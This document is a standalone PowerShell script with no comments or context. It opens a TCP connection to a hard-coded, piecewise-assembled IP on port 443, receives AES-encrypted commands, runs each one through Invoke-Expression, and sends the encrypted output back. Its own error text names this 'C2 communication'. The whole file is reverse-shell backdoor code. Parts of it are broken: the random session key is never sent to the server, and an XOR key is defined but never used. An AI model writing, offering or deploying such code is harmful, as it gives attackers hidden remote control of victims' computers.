
Add-Type -AssemblyName System.Core


$XOR_KEY = 0x55 -bxor 0xAA 


$ObfIP = ("10", "211", "55", "5") -join "." 


$P = 443


$TcpClient = New-Object System.Net.Sockets.TcpClient

Try {
   
    $TcpClient.Connect($ObfIP, $P)

    If ($TcpClient.Connected) {
        $Stream = $TcpClient.GetStream()
        $Writer = New-Object System.IO.BinaryWriter($Stream)
        $Reader = New-Object System.IO.StreamReader($Stream)

        
        $Key = New-Object byte[] 32
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $rng.GetBytes($Key)

        
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $Key
        $aes.GenerateIV()
        $IV = $aes.IV

        
        $Writer.Write($IV, 0, $IV.Length)
        $Writer.Flush() 

       
        While ($true) {
            Try {
                
                $encryptedCMDBytes = New-Object byte[] 4096
                $bytesRead = $Stream.Read($encryptedCMDBytes, 0, $encryptedCMDBytes.Length)

                If ($bytesRead -gt 0) {
                    $decryptedCMD = $aes.CreateDecryptor().TransformFinalBlock($encryptedCMDBytes, 0, $bytesRead)
                    $CMD = [Text.Encoding]::ASCII.GetString($decryptedCMD)

                    If ($CMD -eq "exit") { break }

                    
                    $commandOutput = Invoke-Expression $CMD | Out-String

                  
                    $encryptedResp = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($commandOutput), 0, $commandOutput.Length)

                 
                    $Writer.Write($encryptedResp, 0, $encryptedResp.Length)
                    $Writer.Flush()
                }
            } Catch {
                
                Write-Error "Error during C2 communication: $($_.Exception.Message)"
Break 
            }
        } 
    } Else {
        Write-Error "Failed to connect to $($ObfIP):$P"
    }
} Catch {
    
    Write-Error "Connection attempt failed: $($_.Exception.Message)"
} Finally {
    
    If ($Reader -ne $null) { $Reader.Close() }
    If ($Writer -ne $null) { $Writer.Close() }
    If ($Stream -ne $null) { $Stream.Close() }
    If ($TcpClient -ne $null) { $TcpClient.Close() }
}
